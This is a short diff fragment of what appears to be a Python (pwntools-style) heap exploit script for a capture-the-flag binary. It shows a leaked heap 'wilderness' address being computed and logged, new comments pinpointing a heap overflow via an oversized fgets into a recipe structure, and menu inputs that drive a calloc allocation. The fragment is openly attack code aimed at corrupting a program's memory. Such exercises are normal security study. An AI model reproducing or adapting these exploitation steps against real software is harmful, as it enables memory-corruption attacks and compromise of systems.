@@ -114,6 +114,12 @@ if __name__ == "__main__":
     HEAP_WILDERNESS = leaked + 0x4b4
     log.info("HEAP_WILDERNESS: 0x%x" % HEAP_WILDERNESS)
 
+    #
+    # heap overflow 
+    #
+    # fgets((char*)CURRENT_RECIPE + 140, 1036, stdin)
+    #
+
     s('c')
     s('n') # calloc(1, 0x40c)
     s('g')
